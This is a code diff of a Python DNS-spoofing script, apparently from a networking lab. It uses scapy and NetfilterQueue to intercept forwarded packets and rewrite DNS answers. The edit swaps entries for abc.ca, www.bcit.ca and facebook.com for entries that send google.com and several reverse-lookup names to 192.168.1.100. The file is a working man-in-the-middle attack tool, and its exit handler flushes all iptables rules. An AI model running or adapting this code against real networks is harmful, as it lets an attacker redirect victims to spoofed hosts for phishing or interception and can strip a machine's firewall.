@@ -2,10 +2,15 @@ from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
 
+# DNS mapping records, feel free to add/modify this dictionary
+# for example, google.com will be redirected to 192.168.1.100
 dns_hosts = {
-    b"abc.ca": "34.212.60.182",
-    b"www.bcit.ca": "34.212.60.182",
-    b"facebook.com.": "34.212.60.182"
+    b"www.google.com.": "192.168.1.100",
+    b"google.com.": "192.168.1.100",
+    b'254.1.168.192.in-addr.arpa.': "192.168.1.100",
+    b'101.1.168.192.in-addr.arpa.': "192.168.1.100",
+    b'206.69.250.142.in-addr.arpa.': "192.168.1.100",
+    b'206.3.217.172.in-addr.arpa.': "192.168.1.100"
 }
 
 def process_packet(packet):
@@ -21,6 +26,7 @@ def process_packet(packet):
         print("[Before]:", scapy_packet.summary())
         try:
             scapy_packet = modify_packet(scapy_packet)
+            send(scapy_packet)
         except IndexError:
             # not UDP packet, this can be IPerror/UDPerror packets
             pass
@@ -30,11 +36,12 @@ def process_packet(packet):
     # accept the packet
     packet.accept()
 
+
 def modify_packet(packet):
     """
     Modifies the DNS Resource Record `packet` ( the answer part)
     to map our globally defined `dns_hosts` dictionary.
-    For instance, whenever we see a google.com answer, this function replaces 
+    For instance, whenver we see a google.com answer, this function replaces 
     the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
     """
     # get the DNS question name, the domain name
@@ -60,18 +67,18 @@ def modify_packet(packet):
     return packet
 
 
-QUEUE_NUM = 0
-# insert the iptables FORWARD rule
-os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
-# instantiate the netfilter queue
-queue = NetfilterQueue()
-
-try:
-    # bind the queue number to our callback `process_packet`
-    # and start it
-    queue.bind(QUEUE_NUM, process_packet)
-    queue.run()
-except KeyboardInterrupt:
-    # if want to exit, make sure we
-    # remove that rule we just inserted, going back to normal.
-    os.system("iptables --flush")
+if __name__ == "__main__":
+    QUEUE_NUM = 0
+    # insert the iptables FORWARD rule
+    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+    # instantiate the netfilter queue
+    queue = NetfilterQueue()
+    try:
+        # bind the queue number to our callback `process_packet`
+        # and start it
+        queue.bind(QUEUE_NUM, process_packet)
+        queue.run()
+    except KeyboardInterrupt:
+        # if want to exit, make sure we
+        # remove that rule we just inserted, going back to normal.
+        os.system("iptables --flush")
